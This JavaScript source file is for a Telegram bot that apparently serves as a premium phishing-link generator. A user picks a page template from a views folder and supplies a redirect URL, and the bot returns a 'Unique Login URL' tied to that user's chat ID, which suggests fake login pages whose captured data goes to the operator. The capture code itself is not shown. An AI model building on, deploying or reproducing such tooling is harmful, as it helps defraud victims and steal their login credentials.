const fs = require('fs');
const path = require('path');
const { users } = require('../connection/db');
const { checkPremiumMode } = require('../admin/handler/premium');
const { bot } = require('../serverSetup');
const { hostURL } = require('../connection/config');

// Handle /create command
const handleCreateCommand = (msg) => {
  const chatId = msg.chat.id;

  if (!users[chatId]) {
    bot.sendMessage(chatId, 'Please use the /start command first.');
    return;
  }

  if (!checkPremiumMode(chatId)) return;

  if (users[chatId].step === 'selecting_file') {
    bot.sendMessage(chatId, '⚠️ You are already selecting a file. Please choose one from the list.');
    return;
  }

  users[chatId].step = 'selecting_file';

  const viewsFolderPath = path.join(__dirname, '../views');
  fs.readdir(viewsFolderPath, (err, files) => {
    if (err) {
      bot.sendMessage(chatId, 'Error reading the folder.');
      return;
    }

    const fileNames = files.filter(file => path.extname(file) === '.ejs')
                           .map(file => path.basename(file, '.ejs'));

    if (fileNames.length === 0) {
      bot.sendMessage(chatId, 'No files found in the /views folder.');
      return;
    }

    const keyboard = fileNames.map(fileName => [{
      text: fileName,
      callback_data: `select_${fileName}`
    }]);

    bot.sendMessage(chatId, 'Please select a file:', {
      reply_markup: {
        inline_keyboard: keyboard
      }
    });
  });
};

// Handle file selection
const handleFileSelection = (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (!checkPremiumMode(chatId)) return;

  if (data.startsWith('select_')) {
    const selectedFileName = data.replace('select_', '');

    if (!users[chatId]) users[chatId] = {};

    users[chatId].step = 'waiting_for_url';
    users[chatId].selectedFileName = selectedFileName;

    bot.sendMessage(chatId, `You selected: ${selectedFileName}\n🌐 Now enter your URL.`);
  }
};

// Handle URL input
const handleURLInput = (msg) => {
  const chatId = msg.chat.id;
  const messageText = msg.text;

  if (!checkPremiumMode(chatId)) return;

  if (users[chatId]?.step === 'waiting_for_url') {
    if (messageText.startsWith('https://')) {
      users[chatId].userRedirectUrl = `${messageText}?timestamp=${Date.now()}`;
    } else {
      users[chatId].userRedirectUrl = '';
    }

    const uniqueURL = `${hostURL}/${users[chatId].selectedFileName}/${chatId}`;
    bot.sendMessage(chatId, `🌐 Unique Login URL: <b>${uniqueURL}</b>`, { parse_mode: 'HTML' });

    users[chatId].step = null;
  }
};

bot.on('callback_query', (callbackQuery) => {
  handleFileSelection(callbackQuery);
});

bot.on('message', (msg) => {
  // Avoid handling /create again here 
  if (msg.text && !msg.text.startsWith('/')) {
    handleURLInput(msg); 
  }
});

module.exports = {
  handleCreateCommand
};
